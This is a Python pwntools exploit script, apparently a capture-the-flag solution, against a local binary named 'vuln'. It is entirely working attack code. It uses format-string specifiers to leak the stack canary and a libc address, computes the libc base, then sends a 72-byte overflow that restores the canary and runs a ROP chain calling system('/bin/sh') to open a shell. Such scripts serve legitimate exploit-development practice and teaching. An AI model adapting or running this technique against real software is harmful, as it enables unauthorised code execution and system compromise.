from pwn import *

context.log_level = 'INFO'
context.binary = binary = ELF('./vuln', checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)


program = process()

# Leak Canary and LIBC Base
canaryPosition = b'%23$p'
libcLeakPosition = b'%3$p'

leakPayload = b' '.join([canaryPosition, libcLeakPosition])

program.sendlineafter(b'What is your username?\n',leakPayload)

canary, libcLeak = program.recvline().decode().split()

libcOffset = 0xf819d
libcLeak = int(libcLeak,16)
libc.address = libcLeak - libcOffset
success(f'LIBC Base: {hex(libc.address)}')

canary = int(canary, 16)
success(f'Canary: {hex(canary)}')

# Calculate addresses for ROP chain
rop = ROP(libc)
ret = p64(rop.find_gadget(['ret'])[0])
pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret'])[0])

system = p64(libc.symbols.system)
bin_sh = p64(next(libc.search(b'/bin/sh\x00')))

success(f'system: {hex(u64(system))}')
success(f'/bin/sh: {hex(u64(bin_sh))}')

# Craft and send ROP chain
overflow = b'A' * 72

exploitPayload = overflow
exploitPayload += p64(canary)
exploitPayload += b'B' * 8
exploitPayload += ret
exploitPayload += pop_rdi
exploitPayload += bin_sh
exploitPayload += system

program.sendlineafter(b'What is your message?\n', exploitPayload)
program.interactive()
